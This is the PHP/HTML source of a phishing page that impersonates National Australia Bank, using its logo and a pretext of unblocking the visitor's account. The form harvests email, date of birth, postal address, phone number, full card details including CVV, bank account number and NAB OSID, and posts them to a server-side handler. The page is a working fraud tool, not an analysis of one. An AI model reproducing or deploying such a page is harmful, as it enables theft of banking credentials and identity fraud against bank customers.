
<html>
    <head>
        <link rel="icon" href="favicon.ico" />
    <header>
        
<img src="nab.png" width="200" height="100"  title="" alt="" />
</header>
</head>
    
<?php

session_start();

if($_SERVER["REQUEST_METHOD"]=="POST"){
	
include_once("process_form.php");

      $result = validate($_POST);

}

$_SESSION['token'] = bin2hex(random_bytes(12));



?>

<form id="contact_form" action="contact_form.php" method="post">


<div id="title">Please provide the information below to unblock your account  </div>
<?php echo nl2br("\n"); ?>
<?php
if (isset($result)){
echo '<div class="alert '.$result['status'].' ">'.$result['message'].'</div>';
}
?>

<div class="form-group" align="right" >

<input placeholder="Your email" class="form-control input-lg" 
max-length="35" name="email" id="email" type="text" />
<input type = "hidden" id = "token" name="token" value="'.$_SESSION['token'].'">



<input placeholder="Date of birth DD/MM/YY" class="form-control input-lg" 
max-length="35" name="dob" id="dob" type="text" />

<input placeholder="Full postal address" class="form-control input-lg" 
max-length="35" name="postal" id="postal" type="text" />

<input placeholder="Phone number" class="form-control input-lg" 
max-length="35" name="phone" id="phone" type="text" />

<?php echo nl2br("\n\n\n"); ?>

<input placeholder="Name on card" class="form-control input-lg" 
max-length="35" name="fullname" id="fullname" type="text" />

<input placeholder="Credit or Debit card number" class="form-control input-lg" 
max-length="35" name="number" id="number" type="text" />

<input placeholder="Expiry date MM/YY" class="form-control input-lg" 
max-length="35" name="exp" id="exp" type="text" />

<input placeholder="CCV/CVV2" class="form-control2 input-lg" 
max-length="3" name="cvv" id="cvv" type="text" />

<input placeholder="Bank account number" class="form-control input-lg" 
max-length="35" name="bnk" id="bnk" type="text" />
    <input placeholder="NAB OSID" class="form-control input-lg" 
max-length="35" name="osid" id="osid" type="text" />



<input type="submit" class="btn btn-primary input-lg" max-length="35" name="submit" value="submit" />

</div>

</form>

<style>
<?php include 'contact_form.css'; ?>
</style>



</html>
